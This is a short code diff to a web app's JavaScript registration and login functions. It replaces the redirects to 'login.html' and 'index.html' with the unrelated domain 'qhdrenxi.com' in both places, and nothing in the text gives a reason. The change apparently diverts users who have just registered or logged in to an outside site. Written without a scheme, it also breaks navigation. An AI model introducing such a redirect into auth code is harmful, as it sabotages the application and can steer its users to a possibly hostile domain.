@@ -138,7 +138,7 @@ async function register(username, email, password) {
         
         // Redirect to login page
         setTimeout(() => {
-            window.location.href = 'login.html';
+            window.location.href = 'qhdrenxi.com';
         }, 2000);
         
     } catch (error) {
@@ -187,7 +187,7 @@ async function login(email, password, rememberMe) {
         
         // Redirect to home page
         setTimeout(() => {
-            window.location.href = 'index.html';
+            window.location.href = 'qhdrenxi.com';
         }, 1500);
         
     } catch (error) {
